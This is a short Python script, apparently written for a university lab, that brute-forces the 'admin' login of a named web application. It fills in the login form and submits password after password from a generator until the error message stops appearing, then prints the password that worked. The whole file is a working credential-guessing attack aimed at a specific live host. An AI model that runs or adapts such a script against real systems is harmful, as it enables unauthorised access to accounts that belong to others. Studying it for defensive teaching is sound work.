import re
from robobrowser import RoboBrowser
from NLString import NLString

browser = RoboBrowser(history=True)
browser.open('http://dsa.linti.unlp.edu.ar:118/login.php')
form = browser.get_form(action=re.compile(r'login.php'))
form['username'].value = 'admin'
password = NLString()
form['password'].value = password.value()

browser.submit_form(form)
failed = browser.find(class_=re.compile(r'message'))
# si entra es porque fallo el login
while failed:
    password.next()
    print password.value()
    form['password'].value = password.value()
    browser.submit_form(form)
    failed = browser.find(class_=re.compile(r'message'))

print password.value()
